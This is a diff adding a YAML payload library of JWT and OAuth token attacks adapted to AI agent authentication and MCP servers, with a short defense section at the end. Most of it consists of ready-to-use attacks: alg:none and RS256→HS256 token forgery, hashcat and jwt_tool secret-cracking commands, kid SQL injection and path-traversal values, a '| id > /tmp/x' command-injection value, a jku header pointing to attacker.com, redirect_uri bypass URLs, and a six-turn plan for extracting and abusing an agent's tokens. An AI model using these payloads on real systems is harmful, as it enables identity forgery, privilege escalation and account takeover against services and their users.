@@ -1,0 +1,234 @@
+# JWT / OAuth Token Attacks — Agent 场景适配 Payload 库
+# 适配点：Agent 接受 JWT/OAuth token 进行身份验证时（特别是 token passthrough 模式）
+
+metadata:
+  source: codeaudit/hack-skills/jwt-oauth-token-attacks
+  scope: agent auth flow → token verification bypass
+  layer: L5_identity_permission
+  sink_patterns:
+    - "jwt.decode(token, verify=False)"
+    - "verify_signature=False"
+    - "token passthrough (Agent 用 user token 直调下游 API)"
+
+# ============ 1. JWT 基础 ============
+jwt_anatomy:
+  structure: "HEADER.PAYLOAD.SIGNATURE"
+  decode: "echo eyJ... | base64 -d"
+  common_claims_to_modify:
+    - "role → admin"
+    - "isAdmin → true"
+    - "userId → 其他用户"
+    - "email → victim@target.com"
+    - "sub → admin"
+    - "permissions → ['admin', 'write', 'delete']"
+    - "tier → premium"
+
+# ============ 2. alg:none 攻击 ============
+alg_none:
+  description: 服务端不验证签名当 algorithm 是 "none"/"None"/"NONE"
+  steps:
+    - "Step 1: 解码 header"
+    - "Step 2: 创建新 header: {\"alg\":\"none\",\"typ\":\"JWT\"}"
+    - "Step 3: 修改 payload（如 role → admin）"
+    - "Step 4: 构造 token: HEADER.PAYLOAD.（空签名）"
+  tool: "jwt_tool: python3 jwt_tool.py JWT -X a"
+  variants:
+    - "None"
+    - "NONE"
+    - "nOnE"
+    - "无 algorithm 字段"
+
+# ============ 3. RS256 → HS256 Key Confusion ============
+rs256_to_hs256:
+  description: |
+    服务端用 RS256（非对称），公钥可被攻击者获取，
+    攻击者改 alg=HS256，服务端用公钥作为 HMAC secret
+  steps:
+    - "Step 1: 获取公钥（PEM）"
+    - "  来源: /api/.well-known/jwks.json"
+    - "          /certs endpoint"
+    - "          OpenSSL 从 HTTPS 证书提取"
+    - "Step 2: 修改 header: {\"alg\":\"HS256\",\"typ\":\"JWT\"}"
+    - "Step 3: HMAC-SHA256 用 PEM 公钥 bytes 签名"
+  tool: "python3 jwt_tool.py JWT -X k -pk public_key.pem"
+
+# ============ 4. JWT Secret 爆破 ============
+jwt_secret_crack:
+  description: HMAC JWT (HS256/384/512) 弱 secret
+  hashcat: "hashcat -a 0 -m 16500 JWT /usr/share/wordlists/rockyou.txt"
+  john: "john --format=HMAC-SHA256 --wordlist=wordlist.txt jwt.txt"
+  jwt_tool: "python3 jwt_tool.py JWT -C -d wordlist.txt"
+  common_weak_secrets:
+    - "secret"
+    - "password"
+    - "123456"
+    - "qwerty"
+    - "changeme"
+    - "your-256-bit-secret"
+    - "APP_NAME"
+    - "production"
+    - "jwt_secret"
+    - "SECRET_KEY"
+
+# ============ 5. kid Injection ============
+kid_injection:
+  sqli:
+    - header: '{"alg":"HS256","kid":"\' UNION SELECT \'attacker_controlled_key\' FROM dual--"}'
+      backend_query: "SELECT key FROM keys WHERE kid = 'INPUT'"
+      result: "HMAC key = 'attacker_controlled_key'"
+  path_traversal:
+    - header: '{"alg":"HS256","kid":"../../../../dev/null"}'
+      purpose: "HMAC key = empty string（/dev/null 内容）"
+    - header: '{"alg":"HS256","kid":"../../../../etc/hostname"}'
+      purpose: "HMAC key = hostname 字符串"
+  command_injection:
+    - header: '{"alg":"HS256","kid":"| id > /tmp/x"}'
+      purpose: "如果 kid 拼入命令（罕见但可能）"
+
+# ============ 6. jku / x5u Header 注入 ============
+jku_x5u:
+  description: |
+    jku 指向 JSON Web Key Set URL，未白名单 → 攻击者提供恶意 JWKS
+  payload:
+    header: '{"alg":"RS256","jku":"https://attacker.com/malicious-jwks.json","kid":"my-key"}'
+  setup:
+    - "生成 RSA 密钥对: openssl genrsa -out private.pem 2048"
+    - "提取公钥: openssl rsa -in private.pem -pubout -out public.pem"
+    - "用 python-jwcrypto 创建 JWKS"
+    - "在 attacker.com 托管 malicious-jwks.json"
+    - "用攻击者私钥签 JWT"
+    - "服务端获取 attacker JWKS → 用 attacker 公钥验证 → 通过"
+  tool: "python3 jwt_tool.py JWT -X s -ju https://attacker.com/malicious-jwks.json"
+
+# ============ 7. OAuth — state 缺失（CSRF）============
+oauth_csrf:
+  description: state 参数防止 OAuth CSRF，缺失或可预测
+  attack_flow:
+    - "1. 点击 'Login with Google' → OAuth 启动"
+    - "   拦截 redirect URL: https://accounts.google.com/oauth2/auth?client_id=APP_ID&redirect_uri=https://target.com/callback&state=MISSING_OR_PREDICTABLE&code=..."
+    - "2. 截获 authorization code"
+    - "3. 构造 URL: https://target.com/oauth/callback?code=ATTACKER_CODE"
+    - "4. 受害者点击 → 他们的会话绑定到 ATTACKER 的 OAuth identity"
+    - "5. ACCOUNT TAKEOVER"
+
+# ============ 8. redirect_uri bypass ============
+redirect_uri_bypass:
+  description: redirect_uri 校验不严
+  techniques:
+    subdomain_abuse:
+      - "https://target.com.attacker.com/callback"
+      - "https://attacker.target.com/callback"
+    path_traversal:
+      - "https://target.com/oauth/callback/../../attacker/path"
+    parameter_pollution:
+      - "https://target.com/callback?redirect=https://attacker.com"
+    open_redirect_in_redirect:
+      - "redirect_uri=https://target.com/oauth/redirect?to=https://attacker.com"
+    fragment_injection:
+      - "redirect_uri=https://target.com#@attacker.com/callback"
+    wildcard_domain:
+      - "redirect_uri=https://*.target.com/callback（白名单太宽）"
+
+# ============ 9. PKCE Bypass ============
+pkce_bypass:
+  description: PKCE (Proof Key for Code Exchange) 缺失或弱
+  attacks:
+    no_pkce:
+      - "公共客户端（如 mobile/SPA）应使用 PKCE，否则 authorization code 可被截获"
+    weak_code_verifier:
+      - "code_verifier 长度 < 43（应 43-128）"
+      - "code_verifier 非 [A-Z][a-z][0-9]-_ 字符"
+    code_challenge_method_plain:
+      - "S256 应替代 plain，否则 verifier 直接传输"
+
+# ============ 10. Token 泄漏途径 ============
+token_leakage:
+  referer_header:
+    - description: 第三方资源加载泄漏 token via Referer
+    example: "OAuth callback 页面有 <img src='https://attacker.com/tracker'>"
+  history_logs:
+    - "前端日志 console.log(token)"
+    - "URL 中含 token（如 ?token=xxx）"
+    - "localStorage / sessionStorage 中明文"
+  error_pages:
+    - "错误页中反射 token（如 'Invalid token: eyJ...'）"
+  cache:
+    - "代理/CDN 缓存 token"
+
+# ============ 11. Agent 场景特化 ============
+agent_specific:
+  description: |
+    Agent 中 JWT/OAuth 攻击的特殊考虑：
+    1. Token Passthrough 模式：Agent 把用户 token 透传给下游 API
+    2. 三跳安全模型（User → Agent → MCP → Data）
+    3. Agent 长期持有 token，过期/撤销检测
+  high_risk_patterns:
+    - name: "agent_token_passthrough"
+      severity: critical
+      description: "Agent 用 user 的 OAuth token 直调下游 API，scope 不匹配 → BOLA"
+    - name: "agent_static_api_key"
+      severity: high
+      description: "Agent 配置 hardcoded API key（长期有效）"
+    - name: "agent_token_no_refresh"
+      severity: medium
+      description: "Agent 不刷新 token，过期后用旧 token 重试"
+    - name: "agent_token_in_logs"
+      severity: high
+      description: "Agent 把 token 写入日志"
+  token_passthrough_attack:
+    description: |
+      OWASP 列出禁止的 Token Passthrough 模式：
+      服务端应做 Token Exchange（OBO）而非透传
+    scenario:
+      - "User A 给 Agent token A (scope: read:user)"
+      - "Agent 用 token A 调 Admin API (需 scope: admin)"
+      - "Admin API 不校验 scope → 用户 A 访问其他用户数据"
+    mitigation:
+      - "实施 OBO (On-Behalf-Of) Token Exchange"
+      - "三跳安全模型（User → Agent → MCP → Data，每跳独立 token）"
+      - "数据层 ownership 验证"
+  multi_turn_strategy:
+    turn_1: "询问：'Agent 如何获取/存储 token？'"
+    turn_2: "观察：'Authorization: Bearer xxx' 头"
+    turn_3: "分析：JWT 解码，看 algorithm + claims"
+    turn_4: "alg:none 测试：{\"alg\":\"none\"} → 修改 claims → 提交"
+    turn_5: "RS256→HS256：获取公钥 → 重签"
+    turn_6: "kid 注入：{\"kid\":\"../../../../dev/null\"}"
+  mcp_oauth_attack:
+    description: |
+      MCP Server 用 OAuth 验证 Agent 身份
+    attacks:
+      - "alg:none 绕过验证"
+      - "kid SQLi 提取 secret"
+      - "redirect_uri bypass 截获 code"
+      - "scope escalation（申请的 scope vs 实际）"
+
+# ============ 12. 案例 ============
+cases:
+  cve_2022_21449:
+    description: ECDSA signature bypass (Java)
+  cve_2018_1000531:
+    description: jose4j JWT signature verification bypass
+  shopify_bug_bounty:
+    description: JWT alg:none 绕过 → admin 接管
+
+# ============ 13. 防御要点 ============
+defense:
+  jwt:
+    - "明确 algorithm whitelist（如只允许 RS256）"
+    - "验证 signature 不要基于 algorithm 字段"
+    - "kid 参数严格白名单（不要拼入 SQL/命令/路径）"
+    - "jku/x5u URL 严格白名单"
+    - "secret 用强随机（>=256 bit）"
+  oauth:
+    - "强制使用 state 参数（CSRF token）"
+    - "redirect_uri 严格白名单"
+    - "强制 PKCE（公共客户端）"
+    - "Token Exchange 替代 Token Passthrough"
+    - "token 短期 + refresh"
+    - "scope 严格校验（不要给 agent 过宽 scope）"
+  agent_specific:
+    - "Agent 用自己独立身份（OBO Token Exchange）"
+    - "三跳安全模型"
+    - "MCP Server 验证 token audience"
+    - "scope 最小化（每工具按需）"
